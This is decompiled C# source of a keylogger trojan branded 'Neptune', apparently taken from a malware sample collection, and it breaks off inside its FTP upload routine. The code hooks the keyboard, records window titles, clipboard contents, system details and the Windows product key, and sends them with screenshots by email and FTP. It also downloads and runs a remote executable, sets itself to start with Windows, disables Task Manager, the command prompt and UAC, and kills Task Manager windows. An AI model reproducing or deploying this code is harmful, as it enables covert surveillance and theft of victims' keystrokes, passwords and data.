// Decompiled with JetBrains decompiler
// Type: Module1
// Assembly: SA, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 84D7D68B-6F91-4E8D-937C-90D0FAA28CAE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.MSIL.Petun.a-e076b49b169714ec3164f22bfabe54e2975687dc1e152420c8cb3c4f909a7d13.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
internal sealed class Module1
{
  private static bool qfcWolIeD = false;
  private static bool GjyRlF = false;
  private static bool LQBtCf = false;
  private static bool GfumXF = false;
  private static bool ToCobD = false;
  private static bool koOozt = false;
  private static string IEQgvR = "20";
  private static string xeyEM = "AaD";
  private static int puRYf = 1;
  private static string ZbTsI = "KwXt";
  public static string bEIWT = "CurrentUser";
  private static string FOaDW = "GUCTGK";
  private static string rDwPx = "RMBVMDQbKJ";
  private static string EPguDEO = "iexplorer.exe";
  private static string SDDate = "+SDDate+";
  private static bool TakeScrns = false;
  private static string[] Message = new string[3]
  {
    "+MsgFalse+",
    "+MsgMsg+",
    "+Ico+"
  };
  private static string Delay = "+DelOff+";
  private static bool FRMsg = false;
  private static bool NoEL = false;
  private static bool SSTime = false;
  private static string SSInt = "10";
  private static bool RJxdZZY = false;
  private static string SiYbTrV = "http://www.exampleserver.com/directfile.exe";
  private static bool IVgPOCC = false;
  private static string mFQFCvO = "setup.exe";
  private static bool JbYvRp = true;
  private static bool osumMb = false;
  private static string kpEziv = "LHs1gVoZGRA=";
  private static string uSNqs = "ftp.exampleserver.com";
  private static string jDiHYy = "LHs1gVoZGRA=";
  private static string ClwDyK = "/";
  private static string qsCMHj = "smtp.gmail.com";
  private static string bHQRPUFx = "7uQ+a47HwGDI4eWm+XycbeN1DTUzcOTQ6GaAChodf1k=";
  private static string jyqbJLfI = "hiwUUmNUi7fn9gllSE6Ihw==";
  private static string MLmUlXbC = "example@exampleserver.com";
  private static string GCNetPDM = "587";
  private static string DirrqvSZ = "----[ ";
  private static string KZSCkmHj = " ]----";
  private static bool qDeyd;
  private static bool fZrax;
  private static bool oGUcd = true;
  private static bool kRXqy = true;
  private static bool zFqwE = true;
  private static bool qskKm = true;
  private const int HTjkGIRoW = 257;
  private const short dcgSLSwXJ = 256;
  private const int YsiZnxggT = 260;
  private const int fTRLdawTr = 261;
  private static IntPtr KeyboardHandle = (IntPtr) 0;
  private static string LastCheckedForegroundTitle = "";
  private static Module1.KeyboardHookDelegate callback = (Module1.KeyboardHookDelegate) null;
  private static string GwnCM;

  public static string qHIdfoM
  {
    get => Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    set
    {
    }
  }

  public static string emcIDE
  {
    get => Environment.GetFolderPath(Environment.SpecialFolder.Favorites);
    set
    {
    }
  }

  public static string GgShlo
  {
    get => Environment.GetFolderPath(Environment.SpecialFolder.Personal);
    set
    {
    }
  }

  public static string eTneVi
  {
    get => Environment.GetFolderPath(Environment.SpecialFolder.System);
    set
    {
    }
  }

  public static string cyLZHY
  {
    get => Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("\\system32", "");
    set
    {
    }
  }

  public static string LT
  {
    get => Environment.MachineName + " - " + DateTime.Now.ToString().Replace(" ", "-").Replace("/", "-").Replace(":", ".");
    set
    {
    }
  }

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int CallNextHookEx(
    int hHook,
    int nCode,
    int wParam,
    Module1.dlxatZ lParam);

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int sGFV(int hHook);

  [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int SetWindowsHookEx(
    int idHook,
    Module1.KeyboardHookDelegate lpfn,
    int hmod,
    int dwThreadId);

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetAsyncKeyState(int vKey);

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetForegroundWindow();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

  private static string CyVrQ()
  {
    string str;
    try
    {
      string lpString = new string(char.MinValue, 100);
      Module1.GetWindowText(Module1.GetForegroundWindow(), ref lpString, 100);
      str = lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = "";
      ProjectData.ClearProjectError();
    }
    return str;
  }

  private static object FOlgK()
  {
    object obj;
    try
    {
      obj = (object) (Module1.KeyboardHandle != (IntPtr) 0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      obj = (object) "";
      ProjectData.ClearProjectError();
    }
    return obj;
  }

  public static void JFQTiEFPY()
  {
    try
    {
      Module1.callback = new Module1.KeyboardHookDelegate(Module1.ZXzhy);
      Module1.KeyboardHandle = (IntPtr) Module1.SetWindowsHookEx(13, Module1.callback, (int) Process.GetCurrentProcess().MainModule.BaseAddress, 0);
      int num = Module1.KeyboardHandle != (IntPtr) 0 ? 1 : 0;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void Chqq()
  {
    try
    {
      if (!Conversions.ToBoolean(Module1.FOlgK()) || Module1.sGFV((int) Module1.KeyboardHandle) == 0)
        return;
      Module1.KeyboardHandle = (IntPtr) 0;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static string HbEJX(
    ref string strSource,
    ref string strStart,
    ref string strEnd,
    ref int startPos = 0)
  {
    int length = strStart.Length;
    string str = string.Empty;
    int num1 = strSource.IndexOf(strStart, startPos);
    int num2 = strSource.IndexOf(strEnd, checked (num1 + length));
    if (num1 != -1 && num2 != -1)
      str = strSource.Substring(checked (num1 + length), checked (num2 - num1 + length));
    return str;
  }

  public static int ZXzhy(int Code, int wParam, ref Module1.dlxatZ lParam)
  {
    int num;
    try
    {
      object obj = (object) Module1.CyVrQ();
      if (Operators.ConditionalCompareObjectNotEqual(obj, (object) Module1.LastCheckedForegroundTitle, false))
      {
        Module1.LastCheckedForegroundTitle = Conversions.ToString(obj);
        Module1.GwnCM = Conversions.ToString(Operators.ConcatenateObject((object) Module1.GwnCM, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("\r\n" + Module1.DirrqvSZ), obj), (object) " - "), (object) DateAndTime.Now.ToString()), (object) Module1.KZSCkmHj), (object) "\r\n")));
      }
      string Left = "";
      if (wParam == 256 | wParam == 260)
      {
        if (Code >= 0 && MyProject.Computer.Keyboard.CtrlKeyDown & MyProject.Computer.Keyboard.AltKeyDown & lParam.vkCode == 83)
        {
          num = 1;
          goto label_130;
        }
        else
        {
          switch (lParam.vkCode)
          {
            case 8:
              if (Module1.GwnCM.EndsWith(Module1.KZSCkmHj + "\r\n") | !Module1.kRXqy | Module1.GwnCM.EndsWith("]"))
              {
                Left = "[BS]";
                break;
              }
              Module1.GwnCM = Module1.GwnCM.Remove(checked (Module1.GwnCM.ToString().Length - 1));
              Left = "";
              break;
            case 9:
              Left = "\t";
              break;
            case 13:
              Left = "\r\n";
              break;
            case 20:
              if (Module1.oGUcd)
              {
                Module1.fZrax = !MyProject.Computer.Keyboard.CapsLock;
                break;
              }
              Left = !MyProject.Computer.Keyboard.CapsLock ? "[cl]" : "[/cl]";
              break;
            case 27:
              Left = " [esc] ";
              break;
            case 32:
              Left = " ";
              break;
            case 37:
              Left = "[<]";
              break;
            case 38:
              Left = "[^]";
              break;
            case 39:
              Left = "[>]";
              break;
            case 40:
              Left = "[V]";
              break;
            case 46:
              Left = " [dlt] ";
              break;
            case 48:
            case 49:
            case 50:
            case 51:
            case 52:
            case 53:
            case 54:
            case 55:
            case 56:
            case 57:
              if (Module1.qDeyd)
              {
                Left = Conversions.ToString(Strings.ChrW(lParam.vkCode));
                if (Operators.CompareString(Left, "1", false) == 0)
                {
                  Left = "!";
                  break;
                }
                if (Operators.CompareString(Left, "2", false) == 0)
                {
                  Left = "@";
                  break;
                }
                if (Operators.CompareString(Left, "3", false) == 0)
                {
                  Left = "#";
                  break;
                }
                if (Operators.CompareString(Left, "4", false) == 0)
                {
                  Left = "$";
                  break;
                }
                if (Operators.CompareString(Left, "5", false) == 0)
                {
                  Left = "%";
                  break;
                }
                if (Operators.CompareString(Left, "6", false) == 0)
                {
                  Left = "^";
                  break;
                }
                if (Operators.CompareString(Left, "7", false) == 0)
                {
                  Left = "&";
                  break;
                }
                if (Operators.CompareString(Left, "8", false) == 0)
                {
                  Left = "*";
                  break;
                }
                if (Operators.CompareString(Left, "9", false) == 0)
                {
                  Left = "(";
                  break;
                }
                if (Operators.CompareString(Left, "0", false) == 0)
                {
                  Left = ")";
                  break;
                }
                break;
              }
              Left = Conversions.ToString(Strings.ChrW(lParam.vkCode));
              break;
            case 65:
            case 66:
            case 67:
            case 68:
            case 69:
            case 70:
            case 71:
            case 72:
            case 73:
            case 74:
            case 75:
            case 76:
            case 77:
            case 78:
            case 79:
            case 80:
            case 81:
            case 82:
            case 83:
            case 84:
            case 85:
            case 86:
            case 87:
            case 88:
            case 89:
            case 90:
              Left = !(Module1.qDeyd | Module1.fZrax) ? Conversions.ToString(Strings.ChrW(checked (lParam.vkCode + 32))) : Conversions.ToString(Strings.ChrW(checked (lParam.vkCode + 32))).ToUpper();
              break;
            case 96:
            case 97:
            case 98:
            case 99:
            case 100:
            case 101:
            case 102:
            case 103:
            case 104:
            case 105:
              Left = Conversions.ToString(Strings.ChrW(lParam.vkCode));
              if (Operators.CompareString(Left, "a", false) == 0)
                Left = Conversions.ToString(1);
              if (Operators.CompareString(Left, "b", false) == 0)
                Left = Conversions.ToString(2);
              if (Operators.CompareString(Left, "c", false) == 0)
                Left = Conversions.ToString(3);
              if (Operators.CompareString(Left, "d", false) == 0)
                Left = Conversions.ToString(4);
              if (Operators.CompareString(Left, "e", false) == 0)
                Left = Conversions.ToString(5);
              if (Operators.CompareString(Left, "f", false) == 0)
                Left = Conversions.ToString(6);
              if (Operators.CompareString(Left, "g", false) == 0)
                Left = Conversions.ToString(7);
              if (Operators.CompareString(Left, "h", false) == 0)
                Left = Conversions.ToString(8);
              if (Operators.CompareString(Left, "i", false) == 0)
                Left = Conversions.ToString(9);
              if (Operators.CompareString(Left, "`", false) == 0)
              {
                Left = Conversions.ToString(0);
                break;
              }
              break;
            case 109:
            case 189:
              Left = !Module1.qDeyd ? "-" : "_";
              break;
            case 110:
            case 190:
              Left = Module1.qDeyd ? ">" : ".";
              break;
            case 112:
            case 113:
            case 114:
            case 115:
            case 116:
            case 117:
            case 118:
            case 119:
            case 120:
            case 121:
            case 122:
            case 123:
            case 124:
            case 125:
            case 126:
            case (int) sbyte.MaxValue:
            case 128:
            case 129:
            case 130:
            case 131:
            case 132:
            case 133:
            case 134:
            case 135:
              Left = "[F" + Conversions.ToString(checked (lParam.vkCode - 111)) + "]";
              break;
            case 160:
            case 161:
              if (!Module1.oGUcd)
              {
                Left = " [qDeyd] ";
                break;
              }
              Module1.qDeyd = true;
              break;
            case 162:
            case 163:
              Left = " [ctrl] ";
              break;
            case 164:
              Left = " [alt] ";
              break;
            case 165:
              Left = " [ralt] ";
              break;
            default:
              Left = Conversions.ToString(lParam.vkCode);
              if (Module1.qDeyd)
              {
                if (Operators.CompareString(Left, "192", false) == 0)
                  Left = "~";
                if (Operators.CompareString(Left, "219", false) == 0)
                  Left = "{";
                if (Operators.CompareString(Left, "221", false) == 0)
                  Left = "}";
                if (Operators.CompareString(Left, "220", false) == 0)
                  Left = "|";
                if (Operators.CompareString(Left, "222", false) == 0)
                  Left = "\"";
                if (Operators.CompareString(Left, "186", false) == 0)
                  Left = ":";
                if (Operators.CompareString(Left, "188", false) == 0)
                  Left = "<";
                if (Operators.CompareString(Left, "191", false) == 0)
                  Left = "?";
                if (Operators.CompareString(Left, "187", false) == 0)
                  Left = "+";
              }
              else if (!Module1.qDeyd)
              {
                if (Operators.CompareString(Left, "192", false) == 0)
                  Left = "`";
                if (Operators.CompareString(Left, "219", false) == 0)
                  Left = "[";
                if (Operators.CompareString(Left, "221", false) == 0)
                  Left = "]";
                if (Operators.CompareString(Left, "220", false) == 0)
                  Left = "\\";
                if (Operators.CompareString(Left, "222", false) == 0)
                  Left = "'";
                if (Operators.CompareString(Left, "186", false) == 0)
                  Left = ";";
                if (Operators.CompareString(Left, "188", false) == 0)
                  Left = ",";
                if (Operators.CompareString(Left, "191", false) == 0)
                  Left = "/";
                if (Operators.CompareString(Left, "187", false) == 0)
                  Left = "=";
              }
              if (Operators.CompareString(Left, "107", false) == 0)
                Left = "+";
              if (Operators.CompareString(Left, "107", false) == 0)
                Left = "*";
              if (Operators.CompareString(Left, "111", false) == 0)
                Left = "/";
              if (Operators.CompareString(Left, "44", false) == 0)
              {
                Left = " [SS] ";
                break;
              }
              break;
          }
        }
      }
      else if (wParam == 257 | wParam == 261)
      {
        switch (lParam.vkCode)
        {
          case 160:
          case 161:
            if (!Module1.oGUcd)
              Left = "[/qDeyd]";
            Module1.qDeyd = false;
            break;
          case 162:
          case 163:
            Left = "[/ctrl]";
            break;
          case 164:
            Left = "[/lalt]";
            break;
          case 165:
            Left = "[/ralt]";
            break;
        }
      }
      Module1.GwnCM += Left;
      if (Operators.CompareString(Left, "", false) == 0)
        ;
      num = Module1.CallNextHookEx((int) Module1.KeyboardHandle, Code, wParam, lParam);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      num = Conversions.ToInteger("");
      ProjectData.ClearProjectError();
    }
label_130:
    return num;
  }

  [STAThread]
  public static void Main()
  {
    if (!Module1.SDDate.Contains("SDDate+") && DateTime.Compare(DateAndTime.Today.Date, Conversions.ToDate(Module1.SDDate)) == 0)
      Module1.cOUbsT();
    if (!Module1.Delay.Contains("DelOff+"))
      Module1.CPoo(Conversions.ToInteger(Module1.Delay));
    string xeyEm = Module1.xeyEM;
    Module1.xeyEM = Operators.CompareString(xeyEm, "AaD", false) != 0 ? (Operators.CompareString(xeyEm, "FaF", false) != 0 ? (Operators.CompareString(xeyEm, "MaD", false) != 0 ? (Operators.CompareString(xeyEm, "SaF", false) != 0 ? (Operators.CompareString(xeyEm, "WaF", false) != 0 ? Module1.xeyEM : Module1.cyLZHY) : Module1.eTneVi) : Module1.GgShlo) : Module1.emcIDE) : Module1.qHIdfoM;
    Module1.bHQRPUFx = Module1.TripleDESDecode(Module1.bHQRPUFx, "System.Net");
    Module1.jyqbJLfI = Module1.TripleDESDecode(Module1.jyqbJLfI, "System.Net");
    Module1.kpEziv = Module1.TripleDESDecode(Module1.kpEziv, "System.Net");
    Module1.jDiHYy = Module1.TripleDESDecode(Module1.jDiHYy, "System.Net");
    Module1.EPguDEO = "\\" + Module1.EPguDEO;
    if (Operators.CompareString(Application.StartupPath, Module1.xeyEM, false) != 0)
    {
      if (!Module1.Message[0].Contains("MsgFalse+"))
      {
        MessageBoxIcon messageBoxIcon = new MessageBoxIcon();
        MessageBoxIcon integer = (MessageBoxIcon) Conversions.ToInteger(Module1.Message[2]);
        int num = (int) MessageBox.Show(Module1.Message[1], Module1.Message[0], MessageBoxButtons.OK, integer);
      }
      if (System.IO.File.Exists(Module1.xeyEM + Module1.EPguDEO))
        ProjectData.EndApp();
      if (Module1.FRMsg)
      {
        string str1;
        if (Module1.JbYvRp)
        {
          ref string local1 = ref Module1.qsCMHj;
          ref string local2 = ref Module1.bHQRPUFx;
          ref string local3 = ref Module1.jyqbJLfI;
          ref string local4 = ref Module1.MLmUlXbC;
          string str2 = "[First Run] Neptune - " + Environment.MachineName + " - " + Environment.UserName;
          ref string local5 = ref str2;
          str1 = "Hello, this is an email letting you know that your keylogger has been freshly installed on the computer in the title.  Thank you.";
          ref string local6 = ref str1;
          int integer = Conversions.ToInteger(Module1.GCNetPDM);
          ref int local7 = ref integer;
          ref bool local8 = ref Module1.TakeScrns;
          Module1.SendEmail(ref local1, ref local2, ref local3, ref local4, ref local5, ref local6, ref local7, ref local8);
          Module1.GCNetPDM = Conversions.ToString(integer);
        }
        if (Module1.osumMb)
        {
          ref string local9 = ref Module1.uSNqs;
          ref string local10 = ref Module1.ClwDyK;
          ref string local11 = ref Module1.kpEziv;
          ref string local12 = ref Module1.jDiHYy;
          str1 = "Hello, this is a message letting you know that you keylogger has been installed on " + Environment.MachineName + ".";
          ref string local13 = ref str1;
          Module1.UpFTP(ref local9, ref local10, ref local11, ref local12, ref local13);
        }
      }
      if (Module1.RJxdZZY)
      {
        if (System.IO.File.Exists(Path.GetTempPath() + Module1.mFQFCvO))
          System.IO.File.Delete(Path.GetTempPath() + Module1.mFQFCvO);
        MyProject.Computer.Network.DownloadFile(Module1.SiYbTrV, Path.GetTempPath() + Module1.mFQFCvO);
        if (System.IO.File.Exists(Path.GetTempPath() + Module1.mFQFCvO))
        {
          if (Module1.IVgPOCC)
            Process.Start(Path.GetTempPath() + Module1.mFQFCvO, Conversions.ToString(new ProcessStartInfo().WindowStyle == ProcessWindowStyle.Normal));
          else
            Process.Start(Path.GetTempPath() + Module1.mFQFCvO);
        }
      }
      if (Module1.qfcWolIeD)
      {
        Interaction.Shell("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8", AppWinStyle.Hide);
        Interaction.Shell("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 1", AppWinStyle.Hide);
        Interaction.Shell("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2", AppWinStyle.Hide);
      }
      if (Module1.puRYf == 2)
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System ", "DisableTaskMgr", (object) "1");
      if (Module1.LQBtCf)
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoRun", (object) "1");
      if (Module1.GfumXF)
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoViewContextMenu", (object) "1");
      if (Module1.ToCobD)
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object) "2");
      if (Module1.koOozt)
        Interaction.Shell("C:\\Windows\\System32\\ToCobD.exe /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f", AppWinStyle.Hide);
      if (Module1.GjyRlF)
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object) "2");
      MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Module1.xeyEM + Module1.EPguDEO);
      Process.Start(Module1.xeyEM + Module1.EPguDEO);
      if (Operators.CompareString(Module1.FOaDW, "Melt", false) == 0)
        Module1.cOUbsT();
      else if (Operators.CompareString(Module1.FOaDW, "Hide", false) == 0)
        new FileInfo(Application.ExecutablePath).Attributes = FileAttributes.Hidden;
      ProjectData.EndApp();
    }
    if (new srIMO(Module1.rDwPx).IsRunning())
      Environment.Exit(0);
    try
    {
      if (Operators.CompareString(Module1.bEIWT, "CurrentUser", false) == 0 | Operators.CompareString(Module1.bEIWT, "LocalMachine", false) == 0)
        ROS.set_Runonstartup((string) null, ROS.StartupCheckCriteria.Either, true);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) Interaction.MsgBox((object) ex.Message);
      ProjectData.ClearProjectError();
    }
    if (Module1.ZbTsI.Length != 4)
    {
      string[] strArray = Strings.Split(Module1.ZbTsI, ",");
      int index = 0;
      while (index < strArray.Length)
      {
        string str = strArray[index];
        System.IO.File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts", "\r\n127.0.0.1 " + str);
        checked { ++index; }
      }
    }
    Module1.JFQTiEFPY();
    switch (Module1.puRYf)
    {
      case 3:
        new Thread(new ThreadStart(Module1.lgKLrx)).Start();
        break;
      case 4:
        zkSU.Running = true;
        break;
    }
    if (Module1.SSTime)
      new Thread(new ThreadStart(Module1.TimedSS)).Start();
    while (true)
    {
      try
      {
        do
        {
          Module1.WaitEx();
        }
        while (Operators.CompareString(Module1.GwnCM, "", false) == 0 & Module1.NoEL);
        string str = "";
        if (Module1.zFqwE)
          str = str + "System Information - \r\n" + Module1.BZrR() + "\r\n";
        if (Module1.qskKm)
          str = str + "Clipboard: " + Clipboard.GetText();
        Module1.GwnCM = str + Module1.GwnCM;
        Module1.LastCheckedForegroundTitle = "";
        new Thread(new ThreadStart(Module1.yoUdd)).Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }

  public static void TimedSS()
  {
    while (true)
    {
      do
      {
        Module1.WaitEx1();
        if (Module1.JbYvRp)
        {
          ref string local1 = ref Module1.qsCMHj;
          ref string local2 = ref Module1.bHQRPUFx;
          ref string local3 = ref Module1.jyqbJLfI;
          ref string local4 = ref Module1.MLmUlXbC;
          string str1 = "Neptune - " + Environment.MachineName + " - " + Environment.UserName;
          ref string local5 = ref str1;
          string str2 = "Attached is a screenshot of the victim in the title.";
          ref string local6 = ref str2;
          int integer = Conversions.ToInteger(Module1.GCNetPDM);
          ref int local7 = ref integer;
          bool flag = true;
          ref bool local8 = ref flag;
          Module1.SendEmail(ref local1, ref local2, ref local3, ref local4, ref local5, ref local6, ref local7, ref local8);
          Module1.GCNetPDM = Conversions.ToString(integer);
        }
      }
      while (!Module1.osumMb);
      Module1.UpFTPImg(ref Module1.uSNqs, ref Module1.ClwDyK, ref Module1.kpEziv, ref Module1.jDiHYy);
    }
  }

  public static void WaitEx1()
  {
    Thread thread = new Thread(new ThreadStart(Module1.WT1));
    thread.Start();
    thread.Join();
  }

  public static void WT1() => Thread.Sleep(checked ((int) Math.Round(unchecked (Conversions.ToDouble(Module1.SSInt) * 60.0 * 1000.0))));

  public static void yoUdd()
  {
    string gwnCm = Module1.GwnCM;
    Module1.GwnCM = "";
    if (Module1.JbYvRp)
    {
      ref string local1 = ref Module1.qsCMHj;
      ref string local2 = ref Module1.bHQRPUFx;
      ref string local3 = ref Module1.jyqbJLfI;
      ref string local4 = ref Module1.MLmUlXbC;
      string str = "Neptune - " + Environment.MachineName + " - " + Environment.UserName;
      ref string local5 = ref str;
      ref string local6 = ref gwnCm;
      int integer = Conversions.ToInteger(Module1.GCNetPDM);
      ref int local7 = ref integer;
      ref bool local8 = ref Module1.TakeScrns;
      Module1.SendEmail(ref local1, ref local2, ref local3, ref local4, ref local5, ref local6, ref local7, ref local8);
      Module1.GCNetPDM = Conversions.ToString(integer);
    }
    if (!Module1.osumMb)
      return;
    Module1.UpFTP(ref Module1.uSNqs, ref Module1.ClwDyK, ref Module1.kpEziv, ref Module1.jDiHYy, ref gwnCm);
  }

  public static void WaitEx()
  {
    Thread thread = new Thread(new ThreadStart(Module1.WT));
    thread.Start();
    thread.Join();
  }

  public static void WT() => Thread.Sleep(checked ((int) Math.Round(unchecked (Conversions.ToDouble(Module1.IEQgvR) * 60.0 * 1000.0))));

  private static void CPoo(int interval)
  {
    Stopwatch stopwatch = new Stopwatch();
    stopwatch.Start();
    while (stopwatch.ElapsedMilliseconds < (long) interval)
      Application.DoEvents();
    stopwatch.Stop();
  }

  private static string GetWindowsKey()
  {
    object Instance = (object) (NewLateBinding.LateGet((object) Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false), (System.Type) null, "GetValue", new object[1]
    {
      (object) "DigitalProductId"
    }, (string[]) null, (System.Type[]) null, (bool[]) null) as byte[]);
    if (Instance == null)
      return "value was nothing!";
    char[] chArray = new char[29];
    int index = 28;
    do
    {
      if (checked (index + 1) % 6 == 0)
      {
        chArray[index] = '-';
      }
      else
      {
        object Operand = (object) 0;
        int num = 66;
        do
        {
          object Left = Operators.OrObject(Operators.LeftShiftObject(Operand, (object) 8), NewLateBinding.LateIndexGet(Instance, new object[1]
          {
            (object) num
          }, (string[]) null));
          NewLateBinding.LateIndexSet(Instance, new object[2]
          {
            (object) num,
            (object) Conversions.ToByte(Operators.IntDivideObject(Left, (object) 24))
          }, (string[]) null);
          Operand = Operators.ModObject(Left, (object) 24);
          chArray[index] = "BCDFGHJKMPQRTVWXY2346789"[Conversions.ToInteger(Operand)];
          checked { num += -1; }
        }
        while (num >= 52);
      }
      checked { index += -1; }
    }
    while (index >= 0);
    return new string(chArray);
  }

  public static string VFPV(object Bytes)
  {
    string str;
    try
    {
      if (Operators.ConditionalCompareObjectGreaterEqual(Bytes, (object) 1073741824, false))
      {
        str = Strings.Format(Operators.DivideObject(Operators.DivideObject(Operators.DivideObject(Bytes, (object) 1024), (object) 1024), (object) 1024), "#0.00") + " GB";
        goto label_10;
      }
      else if (Operators.ConditionalCompareObjectGreaterEqual(Bytes, (object) 1048576, false))
      {
        str = Strings.Format(Operators.DivideObject(Operators.DivideObject(Bytes, (object) 1024), (object) 1024), "#0.00") + " MB";
        goto label_10;
      }
      else if (Operators.ConditionalCompareObjectGreaterEqual(Bytes, (object) 1024, false))
      {
        str = Strings.Format(Operators.DivideObject(Bytes, (object) 1024), "#0.00") + " KB";
        goto label_10;
      }
      else if (Operators.ConditionalCompareObjectLess(Bytes, (object) 1024, false))
      {
        str = Conversions.ToString(Operators.ConcatenateObject(Conversion.Fix(RuntimeHelpers.GetObjectValue(Bytes)), (object) " Bytes"));
        goto label_10;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = "0 Bytes";
      ProjectData.ClearProjectError();
      goto label_10;
    }
    return "0 Bytes";
label_10:
    return str;
  }

  public static string BZrR() => "Machine Name: " + Environment.MachineName + "\r\n" + "Current User: " + Environment.UserName + "\r\n" + "Operating System: " + Module1.GenerateOperatingSystem() + "\r\n" + "Windows Key: " + Module1.GetWindowsKey() + "\r\n" + "Available Physical Memory: " + Module1.VFPV((object) MyProject.Computer.Info.AvailablePhysicalMemory.ToString()) + "\r\n" + "Available Virtual Memory: " + Module1.VFPV((object) MyProject.Computer.Info.AvailableVirtualMemory.ToString()) + "\r\n" + "System Directory: " + Environment.SystemDirectory + "\r\n" + "Local Time: " + DateAndTime.Now.ToString();

  public static string GenerateOperatingSystem()
  {
    OperatingSystem osVersion = Environment.OSVersion;
    string operatingSystem = "UN";
    switch (osVersion.Platform)
    {
      case PlatformID.Win32Windows:
        switch (osVersion.Version.Minor)
        {
          case 0:
            operatingSystem = "95";
            break;
          case 10:
            operatingSystem = "98";
            break;
          case 90:
            operatingSystem = "ME";
            break;
        }
        break;
      case PlatformID.Win32NT:
        switch (osVersion.Version.Major)
        {
          case 3:
            operatingSystem = "NT";
            break;
          case 4:
            operatingSystem = "NT";
            break;
          case 5:
            if (osVersion.Version.Minor == 0)
            {
              operatingSystem = "2K";
              break;
            }
            if (osVersion.Version.Minor == 1)
            {
              operatingSystem = "XP";
              break;
            }
            if (osVersion.Version.Minor == 2)
            {
              operatingSystem = "2K3";
              break;
            }
            break;
          case 6:
            operatingSystem = "VS";
            if (osVersion.Version.Minor == 0)
            {
              operatingSystem = "VS";
              break;
            }
            if (osVersion.Version.Minor == 1)
            {
              operatingSystem = "W7";
              break;
            }
            break;
        }
        break;
    }
    return operatingSystem;
  }

  public static void lgKLrx()
  {
label_0:
    Module1.CPoo(300);
    Process[] processes = Process.GetProcesses();
    int index = 0;
    while (index < processes.Length)
    {
      Process process = processes[index];
      if (process.MainWindowTitle.Contains("Windows Task Manager"))
      {
        process.Kill();
        Module1.CPoo(700);
      }
      checked { ++index; }
    }
    goto label_0;
  }

  [DllImport("kernel32", EntryPoint = "GetModuleFileNameA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int GetModuleFileName(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, int nSize);

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int ExitProcess(uint uExitCode);

  [DllImport("kernel32", EntryPoint = "MoveFileExW", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int MoveFile([MarshalAs(UnmanagedType.LPTStr), In] string lpExistingFileName, [MarshalAs(UnmanagedType.LPTStr), In] string lpNewFileName, long dwFlags);

  public static void cOUbsT()
  {
    string executablePath1 = Application.ExecutablePath;
    string executablePath2 = Application.ExecutablePath;
    int moduleFileName = Module1.GetModuleFileName(0, ref executablePath2, 256);
    Module1.MoveFile(Strings.Left(executablePath1, moduleFileName), Path.GetTempPath() + "\\tm" + DateTime.Now.Millisecond.ToString() + ".tmp", 8L);
    Module1.ExitProcess(0U);
  }

  public static string UpFTP(
    ref string qsCMHj,
    ref string Dir,
    ref string bHQRPUFx,
    ref string jyqbJLfI,
    ref string upStr)
  {
    string str1;
    try
    {
      string str2 = "\\" + Module1.LT + ".txt";
      string str3 = Path.GetTempPath() + str2;
      System.IO.File.WriteAllText(str3, upStr);
